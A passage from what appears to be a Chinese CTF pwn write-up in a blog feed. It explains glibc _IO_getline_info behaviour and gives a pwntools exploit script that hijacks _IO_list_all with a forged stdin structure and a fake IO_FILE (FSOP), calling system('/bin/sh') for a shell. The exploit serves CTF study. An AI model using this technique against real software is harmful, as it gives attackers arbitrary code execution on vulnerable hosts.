operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io_list_all<span class="token operator">+</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> p64<span class="token punctuation">(</span>io_list_all<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io_list_all<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>首先_IO_buf_base被修改为了stdin的地址.在_IO_getline_info函数的第一次循环中执行以下操作(省略else部分)</p><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"判断输入缓冲区中是否有数据,此时len=0"</span>      _IO_ssize_t len <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"进入__uflow函数,最终向_IO_buf_base指向的stdin中读入132字节数据."</span>    <span class="token string">"要注意的是,在离开__uflow函数的时候,_IO_read_end的值已为&amp;stdin+132"</span>      <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">__uflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>eof<span class="token punctuation">)</span>        <span class="token operator">*</span>eof <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> delim<span class="token punctuation">)</span>        <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">_IO_sputbackc</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">++</span>len<span class="token punctuation">;</span>          <span class="token keyword">return</span> ptr <span class="token operator">-</span> buf<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>      n<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token string">"将输入缓冲区的数据拷贝到目标缓冲区,但由于len==0,这里不做任何事"</span>      <span class="token function">memcpy</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      n <span class="token operator">-</span><span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>然后第二次循环:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"判断输入缓冲区中是否有数据,由于第一次循环中我们直接向_IO_read_ptr写入了&amp;stdin+132的地址,所以第二次循环同样len==0"</span>      _IO_ssize_t len <span class="token operator">=</span> fp<span class="token operator">-></span>_IO_read_end <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token string">"进入__uflow函数,向_IO_buf_base指向io_list_all的中读入0x10字节数据."</span>      <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">__uflow</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>eof<span class="token punctuation">)</span>        <span class="token operator">*</span>eof <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> delim<span class="token punctuation">)</span>        <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token function">_IO_sputbackc</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>extract_delim <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token operator">++</span>len<span class="token punctuation">;</span>          <span class="token keyword">return</span> ptr <span class="token operator">-</span> buf<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token operator">*</span>ptr<span class="token operator">++</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>      n<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token string">"将输入缓冲区的数据拷贝到目标缓冲区,但由于len==0,这里不做任何事"</span>      <span class="token function">memcpy</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> ptr<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> fp<span class="token operator">-></span>_IO_read_ptr<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>      fp<span class="token operator">-></span>_IO_read_ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      ptr <span class="token operator">+</span><span class="token operator">=</span> len<span class="token punctuation">;</span>      n <span class="token operator">-</span><span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>此时已经成功劫持io_list_all.<br>最后进行fsop(其实fsop的布置应该在劫持IO_list_all之前完成,因为程序读取到非1非2的选择会直接调用exit).</p><pre class=" language-python"><code class="language-python">new<span class="token punctuation">(</span><span class="token number">0x200000</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x5ed771</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x200000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x7ee761</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3ed8b0</span>stdin_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>leak_libc<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">,</span>stdin_addr<span class="token punctuation">)</span>new<span class="token punctuation">(</span><span class="token number">0x200000</span><span class="token punctuation">)</span>fake_io_addr<span class="token operator">=</span>libc_base<span class="token number">-0x201000</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">0x10</span> <span class="token comment" spellcheck="true"># 伪造的fake_IO结构体的地址</span>next_chain <span class="token operator">=</span> <span class="token number">0</span>rdi <span class="token operator">=</span> fake_io_addrcall_addr <span class="token operator">=</span> system_addrfake_IO_FILE<span class="token operator">=</span>b<span class="token string">'/bin/sh\x00'</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">#_flags=rdi</span>fake_IO_FILE<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># rcx!=0(FSOP)</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0xb0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_IO_backup_base=rdx</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span>call_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_IO_save_end=call addr(call setcontext/system)</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># _chain</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base<span class="token number">-0x201000</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># _lock = a writable address</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#_wide_data,rax1_addr</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#mode=1</span>fake_IO_FILE <span class="token operator">=</span> fake_IO_FILE<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xd8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3e7d60</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># vtable=IO_wfile_jumps+0x10</span>fake_IO_FILE <span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span>fake_IO_FILE <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_io_addr<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token comment" spellcheck="true"># rax2_addr</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x9eea29</span><span class="token punctuation">)</span><span class="token punctuation">,</span>fake_IO_FILE<span class="token punctuation">)</span>io_list_all <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span>fake_stdin <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token number">0xfbad208b</span><span class="token punctuation">,</span>    io_list_all<span class="token operator">+</span><span class="token number">132</span><span class="token punctuation">,</span>    p64<span class="token punctuation">(</span>io_list_all<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">,</span>    io_list_all<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> fake_stdin<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_io_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>官方wp:<a href="https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#">https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> IO_FILE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
